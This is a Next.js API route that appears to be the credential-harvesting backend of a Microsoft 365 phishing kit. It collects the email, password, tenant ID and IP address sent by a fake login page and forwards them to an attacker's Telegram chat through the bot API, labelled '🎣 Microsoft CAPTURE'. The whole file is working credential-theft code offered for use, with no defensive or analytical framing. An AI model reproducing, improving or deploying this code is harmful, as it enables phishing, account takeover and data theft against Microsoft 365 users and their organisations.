import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()

    const ip =
      request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      request.headers.get('cf-connecting-ip') ||
      request.headers.get('x-real-ip') ||
      '::1'

    const tenantId = data.tenantId || data.tid || 'Unknown'
    const userPrincipal = data.upn || data.email || 'Unknown'
    const password = data.password || 'N/A'
    const domain = data.captureDomain || 'login.microsoftonline.com'

    if (data.session_update) {
      return NextResponse.json({ status: 'success' }, { status: 200 })
    }

    console.log('🎣 Microsoft CAPTURE:', { 
      userPrincipal, 
      hasPassword: password !== 'N/A',
      tenantId, 
      ip 
    })

    await sendTelegram(request, userPrincipal, password, tenantId, ip, domain)

  } catch (err) {
    console.error('❌ Capture error:', err)
    return NextResponse.json({ status: 'success' }, { status: 200 })
  }

  return NextResponse.json({ status: 'success' }, { status: 200 })
}

async function sendTelegram(
  request: NextRequest,
  userPrincipal: string, 
  password: string, 
  tenantId: string, 
  ip: string, 
  domain: string
) {
  if (!process.env.TELEGRAM_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing')
    return
  }

  //MarkdownV2 escape
  const escapeV2 = (text: string): string => {
    return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1')
  }

  const safeUser = escapeV2(userPrincipal)
  const safePass = escapeV2(password) 
  const safeTenant = escapeV2(tenantId)
  const safeIp = escapeV2(ip.replace('::1', 'localhost'))
  const safeDomain = escapeV2(domain)

  // TRIPLE BACKTICKS = INVINCIBLE for passwords
  const passwordBlock = password === 'N/A' 
    ? '*N/A*' 
    : `\`\`\`${safePass}\`\`\``

  const message = `*Microsoft 365 CAPTURED*

*Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}
*IP:* ${safeIp}

*Email:* ${safeUser}
*Tenant:* ${safeTenant}
*Password:*
${passwordBlock}
*Domain:* ${safeDomain}`

  const controller = new AbortController()
  const timeoutId = setTimeout(() => controller.abort(), 10000)

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0'
        },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2',
          disable_web_page_preview: true
        }),
        signal: controller.signal
      }
    )

    clearTimeout(timeoutId)

    if (!res.ok) {
      throw new Error(`HTTP ${res.status}`)
    }

    console.log('✅ Telegram PERFECT')
  } catch (err: any) {
    clearTimeout(timeoutId)
    console.error('⚠️ Telegram failed:', err.message)
  }
}